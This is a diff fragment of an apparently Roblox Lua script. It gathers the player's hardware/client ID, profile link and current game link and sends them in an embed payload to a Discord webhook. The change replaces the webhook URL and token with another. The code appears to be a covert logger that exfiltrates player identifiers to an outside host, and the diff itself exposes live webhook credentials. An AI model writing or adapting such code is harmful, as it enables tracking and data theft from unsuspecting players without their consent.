@@ -2,7 +2,7 @@ local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
 local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
 local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
-local Webhook = 'https://discord.com/api/webhooks/1096658888398479431/9f4kB6l0RZOIwVNfsKLHxAOqlRl5KezV6aSk3aCSSDZ9aN_5ICR5lfL3ZKq4ye8bxO1W'
+local Webhook = 'https://discord.com/api/webhooks/1099297024102387742/uWPRQBzbahSObou8WQOrpHQ7EuJOgyWrP8YgyuYknHBT_Mdb7e8laDYdRBRCEVwEriNp'
 pcall(function()
 local data = {
 ["embeds"] = {
